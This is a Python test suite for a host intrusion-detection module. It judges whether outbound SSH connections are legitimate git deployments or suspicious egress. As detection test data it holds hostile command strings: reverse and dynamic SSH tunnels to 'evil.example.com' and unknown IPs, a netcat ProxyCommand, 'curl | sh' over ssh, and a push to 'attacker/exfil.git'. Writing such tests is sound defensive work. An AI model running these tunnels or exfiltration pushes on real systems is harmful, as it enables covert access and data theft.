import ast
import asyncio
import base64
import hashlib
import hmac
import json
import os
import sys
import tempfile
import time

_REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, _REPO_ROOT)
os.chdir(_REPO_ROOT)

import psutil

import modules.outbound_anomaly_detector as outbound_module
from config.manager import ConfigValidationError, OutboundAnomalyDetectorConfig, ResourceGovernorConfig, RTSAConfig, TceConfig
from core import ssh_egress_context as sec
from core.cpu_governor import configure_cpu_governor, get_cpu_governor
from core.datatypes import BaseEvent, EventCategory, Severity
from core.event_bus import EventBus
from modules import threat_correlation_engine as tce
from modules.outbound_anomaly_detector import OutboundAnomalyDetector
from modules.process_anomaly_detector import ProcessSnapshot

NOW = time.time()
UID = os.getuid()
GITHUB_IP = "20.205.243.166"
UNKNOWN_IP = "203.0.113.77"
USER = "bimbelruangparabintang"
REMOTE = "git@github.com:organization/repository.git"
FETCH_CMD = "ssh -o SendEnv=GIT_PROTOCOL git@github.com git-upload-pack 'organization/repository.git'"


class FakeIO(sec.EgressIO):
    def __init__(self, home, *, dns=None, procs=None):
        super().__init__()
        self.home, self.dns, self.procs = home, dns or {}, procs or {}
        self.resolve_calls = []
        self.brief_calls = 0

    def home_of(self, username):
        return self.home

    def resolve(self, host):
        self.resolve_calls.append(host)
        return self.dns.get(host)

    def process_brief(self, pid):
        self.brief_calls += 1
        return self.procs.get(pid)


def make_repo(tmp, *, remote_url=REMOTE, config_age=7200.0, extra_config="", project="project"):
    home = os.path.join(tmp, "home", USER)
    repo = os.path.join(home, "htdocs", project)
    os.makedirs(os.path.join(repo, ".git"), exist_ok=True)
    os.makedirs(os.path.join(home, ".ssh"), exist_ok=True)
    config = os.path.join(repo, ".git", "config")
    with open(config, "w") as handle:
        handle.write(
            '[core]\n\trepositoryformatversion = 0\n[remote "origin"]\n'
            f"\turl = {remote_url}\n\tfetch = +refs/heads/*:refs/remotes/origin/*\n{extra_config}"
        )
    os.utime(config, (NOW - config_age, NOW - config_age))
    return home, repo


def write_known_hosts(home, *lines):
    with open(os.path.join(home, ".ssh", "known_hosts"), "w") as handle:
        handle.write("\n".join(lines) + "\n")


def hashed_entry(name, keytype="ssh-ed25519"):
    salt = b"0123456789abcdefghij"
    digest = hmac.new(salt, name.encode(), hashlib.sha1).digest()
    return f"|1|{base64.b64encode(salt).decode()}|{base64.b64encode(digest).decode()} {keytype} AAAAC3Nza"


def proc(repo, *, cmdline=FETCH_CMD, ppid=900, uid=UID, username=USER, exe="/usr/bin/ssh", start=None, pid=4100, project="project"):
    return {
        "pid": pid, "ppid": ppid, "uid": uid, "username": username, "exe": exe, "cwd": repo, "cmdline": cmdline,
        "start_time": start if start is not None else NOW - 5, "start_time_ticks": 1, "project": project,
    }


GIT_PARENT = {900: {"pid": 900, "ppid": 800, "exe": "/usr/bin/git", "cmdline": "git pull origin main", "uid": UID},
              800: {"pid": 800, "ppid": 1, "exe": "/usr/bin/bash", "cmdline": "bash deploy.sh", "uid": UID}}
POLICY = sec.SshEgressPolicy()


def assess(process, io, ip=GITHUB_IP, port=22, trust="GITHUB_EDGE", threat=None, history=None):
    return sec.assess_ssh_egress(
        process=process, destination_ip=ip, destination_port=port, provider_trust=trust, policy=POLICY, io=io,
        now=NOW, local_threat=threat, history=history,
    )


def codes(indicators):
    return {i.code for i in indicators}


def test_1_parsers():
    cmd = sec.parse_ssh_command(FETCH_CMD)
    assert (cmd.host, cmd.user, cmd.git_operation, cmd.git_repo_path) == ("github.com", "git", sec.OP_FETCH, "organization/repository")
    assert not cmd.tunnel and not cmd.proxy_or_local_command and not cmd.insecure_hostkey
    push = sec.parse_ssh_command("/usr/bin/ssh git@github.com \"git-receive-pack 'org/repo.git'\"")
    assert push.git_operation == sec.OP_PUSH and push.git_repo_path == "org/repo"
    tunnel = sec.parse_ssh_command("ssh -p 2222 -oStrictHostKeyChecking=no -R 8080:localhost:80 -N user@evil.example.com")
    assert tunnel.tunnel and tunnel.insecure_hostkey and tunnel.port == 2222 and tunnel.host == "evil.example.com"
    assert sec.parse_ssh_command("ssh -o ProxyCommand='nc x 22' host").proxy_or_local_command
    assert sec.parse_ssh_command("ssh -J jump.example.com host").proxy_jump == "jump.example.com"
    uri = sec.parse_ssh_command("ssh ssh://git@ssh.github.com:443/org/repo.git")
    assert uri.host == "ssh.github.com" and uri.port == 443
    assert sec.parse_ssh_command("").host is None and sec.parse_ssh_command("ssh").host is None
    assert sec.parse_ssh_command("ssh 'unterminated").executable == "ssh"

    scp = sec.parse_git_remote_url("origin", REMOTE)
    assert (scp.host, scp.user, scp.path, scp.is_ssh) == ("github.com", "git", "organization/repository", True)
    url = sec.parse_git_remote_url("origin", "ssh://git@ssh.github.com:443/org/repo.git")
    assert (url.host, url.port, url.path) == ("ssh.github.com", 443, "org/repo")
    https = sec.parse_git_remote_url("origin", "https://user:secret@github.com/org/repo.git")
    assert not https.is_ssh and "secret" not in https.safe_url()
    assert sec.parse_git_remote_url("origin", "") is None and sec.parse_git_remote_url("origin", "/local/path") is None

    sections = sec.parse_git_config('[remote "origin"]\n url = https://github.com/org/repo.git\n[url "git@github.com:"]\n insteadOf = https://github.com/\n[core]\n sshCommand = ssh -i k\n')
    remotes = sec.remotes_from_config(sections)
    assert remotes[0].is_ssh and remotes[0].host == "github.com" and remotes[0].path == "org/repo", "insteadOf rewriting is honoured"
    print("Test 1 (ssh command / git remote / git config parsers, insteadOf, credential stripping) PASSED")


def test_2_legitimate_github_deployment_verified():
    with tempfile.TemporaryDirectory() as tmp:
        home, repo = make_repo(tmp)
        write_known_hosts(home, "github.com ssh-ed25519 AAAAC3Nza")
        io = FakeIO(home, dns={"github.com": {GITHUB_IP}}, procs=GIT_PARENT)
        result = assess(proc(repo), io)
        assert result.verdict == sec.VERDICT_VERIFIED, (result.verdict, result.negatives)
        assert result.operation == sec.OP_FETCH and result.repo_id == "organization/repository"
        assert result.destination_evidence == sec.DEST_DNS_MATCH and result.known_hosts_host
        assert result.provider == "GitHub" and result.provider_role == "context_only"
        assert result.suspicion_points == 0 and result.legitimate
        assert {"GIT_TRANSPORT_COMMAND", "PARENT_IS_GIT", "REPOSITORY_OWNED_BY_PROCESS_USER", "TARGET_MATCHES_GIT_REMOTE"} <= codes(result.positives)
        assert result.parent_chain[0].startswith("GIT:")
        meta = result.to_metadata()
        assert meta["provider_role"] == "context_only" and meta["verdict"] == sec.VERDICT_VERIFIED
        no_dns = assess(proc(repo), FakeIO(home, dns={}, procs=GIT_PARENT))
        assert no_dns.verdict == sec.VERDICT_VERIFIED and no_dns.destination_evidence == sec.DEST_KNOWN_HOSTS_HOST_AND_PROVIDER
        write_known_hosts(home, "other.example.org ssh-ed25519 AAAAC3Nza")
        provider_only = assess(proc(repo), FakeIO(home, dns={}, procs=GIT_PARENT))
        assert provider_only.verdict == sec.VERDICT_LIKELY and provider_only.destination_evidence == sec.DEST_PROVIDER_RANGE_ONLY
        print("Test 2 (git pull over ssh to the repo's own remote: VERIFIED via DNS; provider ranges alone only LIKELY) PASSED")


def test_3_github_address_alone_never_helps():
    with tempfile.TemporaryDirectory() as tmp:
        home, repo = make_repo(tmp)
        io = FakeIO(home, dns={"github.com": {GITHUB_IP}}, procs={900: {"pid": 900, "ppid": 1, "exe": "/usr/bin/bash", "cmdline": "bash", "uid": UID}})
        interactive = assess(proc(repo, cmdline="ssh git@github.com"), io)
        assert not interactive.legitimate and interactive.verdict == sec.VERDICT_UNVERIFIED
        arbitrary = assess(proc(repo, cmdline="ssh git@github.com 'curl http://x | sh'"), io)
        assert not arbitrary.legitimate
        not_a_repo = os.path.join(tmp, "plain")
        os.makedirs(not_a_repo)
        no_repo = assess(proc(not_a_repo), FakeIO(home, dns={"github.com": {GITHUB_IP}}, procs=GIT_PARENT))
        assert not no_repo.legitimate and "NO_GIT_REPOSITORY_AT_CWD" in codes(no_repo.negatives)
        print("Test 3 (a GitHub destination without git/repo/remote evidence is NOT legitimate) PASSED")


def test_4_hard_indicators_override_github():
    with tempfile.TemporaryDirectory() as tmp:
        home, repo = make_repo(tmp)
        dns = {"github.com": {GITHUB_IP}}
        write_known_hosts(home, "github.com ssh-ed25519 AAAAC3Nza")
        tunnel = assess(proc(repo, cmdline="ssh -R 9000:127.0.0.1:22 -N git@github.com"), FakeIO(home, dns=dns, procs=GIT_PARENT))
        assert tunnel.verdict == sec.VERDICT_SUSPICIOUS and "TUNNEL_OR_FORWARDING" in codes(tunnel.negatives)
        proxy = assess(proc(repo, cmdline=FETCH_CMD.replace("ssh ", "ssh -o ProxyCommand='nc evil 22' ", 1)), FakeIO(home, dns=dns, procs=GIT_PARENT))
        assert proxy.verdict == sec.VERDICT_SUSPICIOUS
        tmp_parent = {900: {"pid": 900, "ppid": 1, "exe": "/tmp/suspicious", "cmdline": "/tmp/suspicious", "uid": UID}}
        untrusted = assess(proc(repo), FakeIO(home, dns=dns, procs=tmp_parent))
        assert untrusted.verdict == sec.VERDICT_SUSPICIOUS and "PARENT_IN_UNTRUSTED_LOCATION" in codes(untrusted.negatives)
        web = {900: {"pid": 900, "ppid": 1, "exe": "/usr/sbin/php-fpm8.2", "cmdline": "php-fpm: pool www", "uid": UID}}
        web_parent = assess(proc(repo), FakeIO(home, dns=dns, procs=web))
        assert web_parent.verdict == sec.VERDICT_SUSPICIOUS and "PARENT_IS_WEB_RUNTIME" in codes(web_parent.negatives)
        threat = assess(proc(repo), FakeIO(home, dns=dns, procs=GIT_PARENT), threat="webshell_detector")
        assert threat.verdict == sec.VERDICT_SUSPICIOUS and "LOCAL_THREAT_EVIDENCE" in codes(threat.negatives)
        fake_ssh = assess(proc(repo, exe="/home/x/.cache/ssh"), FakeIO(home, dns=dns, procs=GIT_PARENT))
        assert fake_ssh.verdict == sec.VERDICT_SUSPICIOUS and "EXECUTABLE_NOT_SYSTEM_SSH" in codes(fake_ssh.negatives)
        print("Test 4 (tunnel/ProxyCommand/untrusted parent/web-runtime parent/webshell evidence/non-system ssh -> SUSPICIOUS even to GitHub) PASSED")


def test_5_repository_and_remote_consistency():
    with tempfile.TemporaryDirectory() as tmp:
        home, repo = make_repo(tmp)
        io = FakeIO(home, dns={"github.com": {GITHUB_IP}}, procs=GIT_PARENT)
        write_known_hosts(home, "github.com ssh-ed25519 AAAAC3Nza")
        other_owner = assess(proc(repo, uid=UID + 1), io)
        assert not other_owner.legitimate and "REPOSITORY_NOT_OWNED_BY_PROCESS_USER" in codes(other_owner.negatives)
        attacker_repo = assess(proc(repo, cmdline="ssh git@github.com \"git-receive-pack 'attacker/exfil.git'\""), io)
        assert not attacker_repo.legitimate and "GIT_COMMAND_REPOSITORY_DIFFERS_FROM_REMOTE" in codes(attacker_repo.negatives)
        unconfigured = assess(proc(repo, cmdline="ssh git@gitlab.example.net git-upload-pack 'a/b.git'"), io, ip=UNKNOWN_IP, trust=None)
        assert not unconfigured.legitimate and "GIT_TRANSPORT_TO_UNCONFIGURED_REMOTE" in codes(unconfigured.negatives)
        assert "gitlab.example.net" not in io.resolve_calls, "attacker-supplied hostnames are never resolved"
        push_cmd = "ssh git@github.com \"git-receive-pack 'organization/repository.git'\""
        first_push = assess(proc(repo, cmdline=push_cmd, ppid=900), io)
        assert first_push.operation == sec.OP_PUSH and not first_push.legitimate and "PUSH_TO_UNESTABLISHED_REPOSITORY" in codes(first_push.negatives)
        established = sec.SshGitBaseline(min_observations=1)
        established.learn(f"{USER}|project", "organization/repository", sec.OP_FETCH, "x", NOW)
        push = assess(proc(repo, cmdline=push_cmd, ppid=900), io, history=established.history(f"{USER}|project"))
        assert push.verdict == sec.VERDICT_LIKELY and push.operation == sec.OP_PUSH, "a push from a server is never 'verified', and only to an established repository"
        home2, fresh_repo = make_repo(os.path.join(tmp, "fresh"), config_age=30.0)
        write_known_hosts(home2, "github.com ssh-ed25519 AAAAC3Nza")
        fresh = assess(proc(fresh_repo), FakeIO(home2, dns={"github.com": {GITHUB_IP}}, procs=GIT_PARENT))
        assert not fresh.legitimate and "GIT_REMOTE_CONFIG_RECENTLY_MODIFIED" in codes(fresh.negatives), "a freshly added remote is not trusted yet"
        print("Test 5 (ownership, command repo vs configured remote, unconfigured remote, push, freshly modified config) PASSED")


def test_6_destination_mismatch_and_dns_scope():
    with tempfile.TemporaryDirectory() as tmp:
        home, repo = make_repo(tmp, remote_url="git@git.example.net:team/app.git")
        cmd = "ssh git@git.example.net git-upload-pack 'team/app.git'"
        mismatch = assess(proc(repo, cmdline=cmd), FakeIO(home, dns={"git.example.net": {"198.51.100.10"}}, procs=GIT_PARENT), ip=UNKNOWN_IP, trust=None)
        assert mismatch.verdict == sec.VERDICT_SUSPICIOUS and "DESTINATION_NOT_RESOLVED_FROM_HOST" in codes(mismatch.negatives)
        match = assess(proc(repo, cmdline=cmd), FakeIO(home, dns={"git.example.net": {UNKNOWN_IP}}, procs=GIT_PARENT), ip=UNKNOWN_IP, trust=None)
        assert match.verdict == sec.VERDICT_LIKELY and match.destination_evidence == sec.DEST_DNS_MATCH, "DNS alone, with no host key ever trusted by this user, is only LIKELY"
        write_known_hosts(home, "git.example.net ssh-ed25519 AAAAC3Nza")
        match = assess(proc(repo, cmdline=cmd), FakeIO(home, dns={"git.example.net": {UNKNOWN_IP}}, procs=GIT_PARENT), ip=UNKNOWN_IP, trust=None)
        assert match.verdict == sec.VERDICT_VERIFIED, (match.verdict, match.negatives)
        assert match.provider is None, "a self-hosted git server needs no provider: the repo/remote/DNS/known_hosts evidence decides"
        write_known_hosts(home, hashed_entry("git.example.net"))
        hashed = assess(proc(repo, cmdline=cmd), FakeIO(home, dns={}, procs=GIT_PARENT), ip=UNKNOWN_IP, trust=None)
        assert hashed.known_hosts_host and hashed.verdict == sec.VERDICT_LIKELY
        write_known_hosts(home, hashed_entry(UNKNOWN_IP))
        ip_known = assess(proc(repo, cmdline=cmd), FakeIO(home, dns={}, procs=GIT_PARENT), ip=UNKNOWN_IP, trust=None)
        assert ip_known.known_hosts_ip and ip_known.verdict == sec.VERDICT_VERIFIED and ip_known.destination_evidence == sec.DEST_KNOWN_HOSTS_IP
        print("Test 6 (DNS mismatch -> suspicious, DNS/known_hosts (hashed too) corroborate, self-hosted git servers work without a provider) PASSED")


def test_7_ssh_github_port_443_insteadof_and_clone():
    with tempfile.TemporaryDirectory() as tmp:
        home, repo = make_repo(tmp, remote_url="ssh://git@ssh.github.com:443/organization/repository.git")
        cmd = "ssh -p 443 git@ssh.github.com git-upload-pack 'organization/repository.git'"
        write_known_hosts(home, "[ssh.github.com]:443 ssh-ed25519 AAAAC3Nza")
        result = assess(proc(repo, cmdline=cmd), FakeIO(home, dns={"ssh.github.com": {GITHUB_IP}}, procs=GIT_PARENT), port=443)
        assert result.verdict == sec.VERDICT_VERIFIED, (result.verdict, result.negatives)
        wrong_port = assess(proc(repo, cmdline=cmd.replace("-p 443", "-p 2222")), FakeIO(home, dns={"ssh.github.com": {GITHUB_IP}}, procs=GIT_PARENT), port=2222)
        assert not wrong_port.legitimate, "the ssh port must match the configured remote port"
    with tempfile.TemporaryDirectory() as tmp:
        home, repo = make_repo(tmp, remote_url="https://github.com/organization/repository.git",
                               extra_config='[url "git@github.com:"]\n\tinsteadOf = https://github.com/\n')
        write_known_hosts(home, "github.com ssh-ed25519 AAAAC3Nza")
        rewritten = assess(proc(repo), FakeIO(home, dns={"github.com": {GITHUB_IP}}, procs=GIT_PARENT))
        assert rewritten.verdict == sec.VERDICT_VERIFIED
    with tempfile.TemporaryDirectory() as tmp:
        home = os.path.join(tmp, "home", USER)
        target = os.path.join(home, "htdocs")
        os.makedirs(os.path.join(home, ".ssh")); os.makedirs(target)
        clone_parent = {900: {"pid": 900, "ppid": 800, "exe": "/usr/bin/git", "cmdline": f"git clone {REMOTE}", "uid": UID}, 800: GIT_PARENT[800]}
        write_known_hosts(home, "github.com ssh-ed25519 AAAAC3Nza")
        clone = assess(proc(target), FakeIO(home, dns={"github.com": {GITHUB_IP}}, procs=clone_parent))
        assert clone.verdict == sec.VERDICT_LIKELY and "GIT_CLONE_OF_TARGET_HOST" in codes(clone.positives), (clone.verdict, clone.negatives)
        other_clone = dict(clone_parent); other_clone[900] = dict(clone_parent[900], cmdline="git clone git@github.com:attacker/x.git")
        assert assess(proc(target), FakeIO(home, dns={"github.com": {GITHUB_IP}}, procs=other_clone)).legitimate, "same host clone is fine"
        wrong_host = dict(clone_parent); wrong_host[900] = dict(clone_parent[900], cmdline="git clone git@evil.example.com:x/y.git")
        assert not assess(proc(target), FakeIO(home, dns={"github.com": {GITHUB_IP}}, procs=wrong_host)).legitimate
        print("Test 7 (ssh.github.com:443, insteadOf rewrites, `git clone` of the target host capped at LIKELY) PASSED")


def test_8_baseline_learns_only_verified_and_persists():
    baseline = sec.SshGitBaseline(min_observations=3)
    scope = f"{USER}|project"
    assert baseline.history(scope).repositories == () and not baseline.history(scope).is_known("organization/repository")
    for _ in range(3):
        baseline.learn(scope, "organization/repository", sec.OP_FETCH, "20.205.243.0/24", NOW)
    history = baseline.history(scope)
    assert history.is_known("organization/repository") and not history.is_known("attacker/x")
    assert baseline.observation_count(scope, "organization/repository") == 3
    restored = sec.SshGitBaseline(min_observations=3)
    restored.load_state(json.loads(json.dumps(baseline.to_state())))
    assert restored.history(scope).is_known("organization/repository")
    restored.load_state({"broken": 1, "x": {"repos": "no"}})
    assert baseline.prune(NOW + 10 * 604800.0) == 1 and len(baseline) == 0
    with tempfile.TemporaryDirectory() as tmp:
        home, repo = make_repo(tmp)
        write_known_hosts(home, "github.com ssh-ed25519 AAAAC3Nza")
        io = FakeIO(home, dns={"github.com": {GITHUB_IP}}, procs=GIT_PARENT)
        base = sec.SshGitBaseline(min_observations=1)
        base.learn(scope, "some/other-repo", sec.OP_FETCH, "x", NOW)
        result = assess(proc(repo), io, history=base.history(scope))
        assert "NEW_REPOSITORY_FOR_SCOPE" in codes(result.negatives) and result.verdict == sec.VERDICT_LIKELY
        base.learn(scope, "organization/repository", sec.OP_FETCH, "x", NOW)
        known = assess(proc(repo), io, history=base.history(scope))
        assert "REPOSITORY_IN_SCOPE_BASELINE" in codes(known.positives) and known.verdict == sec.VERDICT_VERIFIED
    print("Test 8 (per-user/project baseline: learns only verified activity, flags a new repository, persists, prunes) PASSED")


def snapshot(pid, *, exe, cwd, cmdline, username, uid, ppid=900, project="project", start=None):
    return ProcessSnapshot(
        pid=pid, ppid=ppid, uid=uid, gid=uid, exe=exe, cwd=cwd, cmdline=cmdline, username=username,
        start_time=start if start is not None else time.time() - 5, project=project, network_active=True, start_time_ticks=pid,
    )


def make_detector(tmpdir, home, *, dns=None, procs=None, **overrides):
    overrides.setdefault("enabled", True)
    overrides.setdefault("learning_period_seconds", 0.0)
    overrides.setdefault("baseline_state_path", os.path.join(tmpdir, "outbound.json"))
    detector = OutboundAnomalyDetector(EventBus(), OutboundAnomalyDetectorConfig(**overrides))
    published = []
    detector.publish = published.append
    detector._baseline.seed_started_at(time.time() - 100000.0)
    detector._egress_io = FakeIO(home, dns=dns, procs=procs if procs is not None else GIT_PARENT)
    return detector, published


def install_snapshots(snapshots):
    outbound_module.read_process_snapshot = lambda pid: snapshots.get(pid)


async def scan(detector, rows):
    normalized = [row if len(row) == 5 else (*row, 50000 + i) for i, row in enumerate(rows)]
    detector.__class__._collect_connections = staticmethod(lambda: (list(normalized), set()))
    await detector._scan_connections()


def alerts(published):
    return [e for e in published if not e.metadata.get("baseline_candidate")]


def candidates(published):
    return [e for e in published if e.metadata.get("baseline_candidate")]


async def detector_tests():
    configure_cpu_governor(ResourceGovernorConfig(defer_when_system_busy=False))
    get_cpu_governor().reset_for_tests()
    original_reader = outbound_module.read_process_snapshot
    original_collect = OutboundAnomalyDetector.__dict__["_collect_connections"]
    try:
        with tempfile.TemporaryDirectory() as tmp:
            home, repo = make_repo(tmp)
            write_known_hosts(home, "github.com ssh-ed25519 AAAAC3Nza")
            detector, published = make_detector(tmp, home, dns={"github.com": {GITHUB_IP}})
            install_snapshots({4100: snapshot(4100, exe="/usr/bin/ssh", cwd=repo, cmdline=FETCH_CMD, username=USER, uid=UID)})
            await scan(detector, [(4100, GITHUB_IP, 22, psutil.CONN_ESTABLISHED)])
            assert not alerts(published), f"a verified git deployment must not alert: {[e.message[:80] for e in alerts(published)]}"
            found = candidates(published)
            assert len(found) == 1 and found[0].severity == Severity.INFO
            meta = found[0].metadata
            assert meta["notify_discord"] is False and meta["ssh_context_verdict"] == sec.VERDICT_VERIFIED
            assert meta["destination_provider"] == "GitHub" and meta["destination_provider_role"] == "context_only"
            assert meta["ssh_context"]["repository"] == "organization/repository" and meta["score"] == 0
            assert "baseline candidate" in found[0].message and "BUKAN keputusan trust" in found[0].message
            await scan(detector, [(4100, GITHUB_IP, 22, psutil.CONN_ESTABLISHED)])
            install_snapshots({4101: snapshot(4101, exe="/usr/bin/ssh", cwd=repo, cmdline=FETCH_CMD, username=USER, uid=UID)})
            await scan(detector, [(4101, GITHUB_IP, 22, psutil.CONN_ESTABLISHED)])
            assert len(candidates(published)) == 1 and not alerts(published)
            health = await detector.health()
            assert health["ssh_git_legitimate_total"] == 2 and health["ssh_verdicts"] == {sec.VERDICT_VERIFIED: 2}
            print("Test 9 (bimbelruangparabintang: git pull to github.com from its own repo -> one INFO baseline candidate, no alert, repeats silent) PASSED")

        with tempfile.TemporaryDirectory() as tmp:
            home, repo = make_repo(tmp)
            plain = os.path.join(tmp, "home", "web-user", "htdocs", "project")
            os.makedirs(plain)
            detector, published = make_detector(tmp, home, dns={"github.com": {GITHUB_IP}}, procs={900: {"pid": 900, "ppid": 1, "exe": "/usr/bin/bash", "cmdline": "bash", "uid": UID}})
            install_snapshots({
                4200: snapshot(4200, exe="/usr/bin/ssh", cwd=plain, cmdline="ssh git@github.com", username="web-user", uid=UID),
                4201: snapshot(4201, exe="/usr/bin/ssh", cwd=plain, cmdline="ssh git@198.51.100.9", username="web-user", uid=UID, project="project2"),
            })
            await scan(detector, [(4200, GITHUB_IP, 22, psutil.CONN_ESTABLISHED), (4201, "198.51.100.9", 22, psutil.CONN_ESTABLISHED)])
            by_ip = {e.metadata["destination_ip"]: e for e in alerts(published)}
            assert set(by_ip) == {GITHUB_IP, "198.51.100.9"}, "no git context: the GitHub connection alerts exactly like any other"
            assert by_ip[GITHUB_IP].metadata["score"] == by_ip["198.51.100.9"].metadata["score"], "the provider must not change the score"
            assert by_ip[GITHUB_IP].severity == by_ip["198.51.100.9"].severity and by_ip[GITHUB_IP].severity in (Severity.HIGH, Severity.CRITICAL)
            assert by_ip[GITHUB_IP].metadata["ssh_context_verdict"] == sec.VERDICT_UNVERIFIED
            assert "konteks saja, bukan keputusan trust" in by_ip[GITHUB_IP].message
            print("Test 10 (ssh to a GitHub address without git evidence alerts at the same score/severity as any destination) PASSED")

        with tempfile.TemporaryDirectory() as tmp:
            home = os.path.join(tmp, "home", "web-user")
            project = os.path.join(home, "htdocs", "project")
            os.makedirs(project)
            tmp_parent = {900: {"pid": 900, "ppid": 1, "exe": "/tmp/suspicious", "cmdline": "/tmp/suspicious", "uid": UID}}
            detector, published = make_detector(tmp, home, procs=tmp_parent)
            install_snapshots({4300: snapshot(4300, exe="/usr/bin/ssh", cwd=project, cmdline="ssh -N -R 9001:127.0.0.1:22 root@" + UNKNOWN_IP, username="web-user", uid=UID)})
            webshell = BaseEvent(
                source_module="webshell_detector", category=EventCategory.FILE_INTEGRITY_CHANGE, severity=Severity.HIGH,
                message="Possible web shell", raw="", metadata={"related_file": os.path.join(project, "shell.php"), "project": "project", "project_root": project},
            )
            await detector._on_file_change(webshell)
            await scan(detector, [(4300, UNKNOWN_IP, 22, psutil.CONN_ESTABLISHED)])
            found = alerts(published)
            assert len(found) == 1 and found[0].severity == Severity.CRITICAL, [(e.severity, e.metadata["score"]) for e in found]
            meta = found[0].metadata
            assert meta["ssh_context_verdict"] == sec.VERDICT_SUSPICIOUS
            assert any(rule.startswith("SSH_CONTEXT_") for rule in meta["rules"])
            assert {"SSH_CONTEXT_PARENT_IN_UNTRUSTED_LOCATION", "SSH_CONTEXT_TUNNEL_OR_FORWARDING", "SSH_CONTEXT_LOCAL_THREAT_EVIDENCE"} <= set(meta["rules"])
            plain_score = 20 + 25 + 30 + 20
            assert meta["score"] > plain_score, "suspicious context adds score on top of the normal rules"
            print("Test 11 (web-user, parent /tmp/suspicious, unknown IP, tunnel + webshell evidence -> CRITICAL, context adds score) PASSED")

        with tempfile.TemporaryDirectory() as tmp:
            home, repo = make_repo(tmp)
            write_known_hosts(home, "github.com ssh-ed25519 AAAAC3Nza")
            detector, published = make_detector(tmp, home, dns={"github.com": {GITHUB_IP}})
            for i in range(4):
                pid = 4400 + i
                install_snapshots({pid: snapshot(pid, exe="/usr/bin/ssh", cwd=repo, cmdline=FETCH_CMD, username=USER, uid=UID)})
                await scan(detector, [(pid, GITHUB_IP, 22, psutil.CONN_ESTABLISHED)])
            assert not alerts(published) and len(candidates(published)) == 1
            assert detector._ssh_baseline.history(f"{USER}|project").is_known("organization/repository")
            install_snapshots({4450: snapshot(4450, exe="/usr/bin/ssh", cwd=repo, cmdline="ssh -D 1080 -N git@github.com", username=USER, uid=UID)})
            await scan(detector, [(4450, GITHUB_IP, 22, psutil.CONN_ESTABLISHED)])
            assert len(alerts(published)) == 1 and alerts(published)[0].severity in (Severity.HIGH, Severity.CRITICAL), "GitHub + tunnel"
            assert alerts(published)[0].metadata["ssh_context_verdict"] == sec.VERDICT_SUSPICIOUS

        with tempfile.TemporaryDirectory() as tmp:
            home, repo = make_repo(tmp)
            write_known_hosts(home, "github.com ssh-ed25519 AAAAC3Nza")
            detector, published = make_detector(tmp, home, dns={"github.com": {GITHUB_IP}})
            for i in range(4):
                install_snapshots({4460 + i: snapshot(4460 + i, exe="/usr/bin/ssh", cwd=repo, cmdline=FETCH_CMD, username=USER, uid=UID)})
                await scan(detector, [(4460 + i, GITHUB_IP, 22, psutil.CONN_ESTABLISHED)])
            assert not alerts(published)
            await detector._on_file_change(BaseEvent(
                source_module="file_integrity_detector", category=EventCategory.FILE_INTEGRITY_CHANGE, severity=Severity.CRITICAL,
                message="new php in uploads", raw="", metadata={"path": os.path.join(repo, "uploads", "x.php"), "project_root": repo},
            ))
            install_snapshots({4470: snapshot(4470, exe="/usr/bin/ssh", cwd=repo, cmdline=FETCH_CMD, username=USER, uid=UID)})
            await scan(detector, [(4470, GITHUB_IP, 22, psutil.CONN_ESTABLISHED)])
            latest = alerts(published)
            assert len(latest) == 1 and latest[0].metadata["ssh_context_verdict"] == sec.VERDICT_SUSPICIOUS, "a learned baseline never masks high-risk FIM evidence"
            assert latest[0].severity in (Severity.HIGH, Severity.CRITICAL)
            print("Test 12 (GitHub + tunnel alerts; a well-baselined scope with fresh high-risk FIM evidence alerts again) PASSED")

        with tempfile.TemporaryDirectory() as tmp:
            home, repo = make_repo(tmp)
            write_known_hosts(home, "github.com ssh-ed25519 AAAAC3Nza")
            other_dir = os.path.join(tmp, "home", "web-user", "htdocs", "site")
            os.makedirs(other_dir)
            detector, published = make_detector(tmp, home, dns={"github.com": {GITHUB_IP}})
            snaps = {4500 + i: snapshot(4500 + i, exe="/usr/bin/ssh", cwd=repo, cmdline=FETCH_CMD, username=USER, uid=UID) for i in range(4)}
            snaps.update({4610 + i: snapshot(4610 + i, exe="/usr/bin/ssh", cwd=other_dir, cmdline="ssh git@github.com", username="web-user", uid=UID, project="site") for i in range(4)})
            install_snapshots(snaps)
            for i in range(4):
                await scan(detector, [(4500 + i, GITHUB_IP, 22, psutil.CONN_ESTABLISHED)])
            owner_key = detector._process_meta_for(4500)["exe_key"]
            other_key = detector._process_meta_for(4610)["exe_key"]
            assert owner_key != other_key and other_key.startswith("/usr/bin/ssh|web-user|"), (owner_key, other_key)
            assert not alerts(published)
            for i in range(4):
                await scan(detector, [(4610 + i, GITHUB_IP, 22, psutil.CONN_ESTABLISHED)])
            assert [e for e in alerts(published) if e.metadata["username"] == "web-user"], "another user's routine git traffic must not make the destination 'known' for web-user"
            print("Test 13 (ssh baselines are per user/project: one user's git traffic never silences another user) PASSED")

        with tempfile.TemporaryDirectory() as tmp:
            home, repo = make_repo(tmp)
            write_known_hosts(home, "github.com ssh-ed25519 AAAAC3Nza")
            detector, published = make_detector(tmp, home, dns={"github.com": {GITHUB_IP}})
            install_snapshots({4700: snapshot(4700, exe="/usr/bin/ssh", cwd=repo, cmdline=FETCH_CMD, username=USER, uid=UID)})
            original = outbound_module.assess_ssh_egress
            def broken(**kwargs):
                raise RuntimeError("boom")
            outbound_module.assess_ssh_egress = broken
            import logging
            logging.disable(logging.CRITICAL)
            try:
                await scan(detector, [(4700, GITHUB_IP, 22, psutil.CONN_ESTABLISHED)])
            finally:
                logging.disable(logging.NOTSET)
                outbound_module.assess_ssh_egress = original
            assert alerts(published), "an assessment failure must fall back to the normal (unmitigated) scoring"
            assert alerts(published)[0].metadata.get("ssh_context_verdict") is None

        with tempfile.TemporaryDirectory() as tmp:
            home, repo = make_repo(tmp)
            write_known_hosts(home, "github.com ssh-ed25519 AAAAC3Nza")
            detector, published = make_detector(tmp, home, dns={"github.com": {GITHUB_IP}}, ssh_max_assessments_per_cycle=1)
            install_snapshots({4800 + i: snapshot(4800 + i, exe="/usr/bin/ssh", cwd=repo, cmdline=FETCH_CMD, username=USER, uid=UID) for i in range(3)})
            await scan(detector, [(4800 + i, GITHUB_IP, 22, psutil.CONN_ESTABLISHED) for i in range(3)])
            health = await detector.health()
            assert health["ssh_assessments_total"] == 1 and health["ssh_assessments_deferred_total"] == 2
            calls = detector._egress_io.brief_calls
            await scan(detector, [(4800, GITHUB_IP, 22, psutil.CONN_ESTABLISHED)])
